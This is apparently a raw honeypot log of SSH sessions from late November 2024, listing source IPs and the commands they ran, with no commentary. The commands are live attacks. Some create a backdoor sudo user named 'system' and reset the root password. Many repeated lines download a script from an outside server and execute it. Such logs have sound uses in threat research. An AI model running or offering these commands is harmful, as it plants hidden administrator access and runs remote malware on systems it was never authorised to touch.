start
2024-11-29 15:36:02.394635 - ('91.227.62.23', 56098) - whoami
2024-11-29 16:02:56.938092 - ('46.19.143.66', 38636) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 FZGHK9ef) system && sudo usermod -aG sudo system
2024-11-29 16:02:57.283163 - ('46.19.143.66', 38636) - lscpu && echo -e "FZGHK9ef\nFZGHK9ef" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-29 22:29:30.527176 - ('46.19.143.66', 52598) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Tug8BBT4) system && sudo usermod -aG sudo system
2024-11-29 22:29:38.486674 - ('46.19.143.66', 52598) - lscpu && echo -e "Tug8BBT4\nTug8BBT4" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-29 23:54:42.705048 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:42.927771 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:43.089452 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:43.192212 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:43.436370 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:43.852716 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:44.057423 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:44.244726 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:44.327906 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:44.589447 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:44.920008 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:45.127116 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:45.608939 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:45.739736 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:45.838464 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:45.991791 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:46.197181 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:46.835082 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:46.898279 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:46.909252 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:47.091262 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:47.306206 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:47.882097 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:47.972672 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:47.979675 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:48.189908 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:48.368856 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:48.946594 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:49.027524 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:49.032807 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:49.277960 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
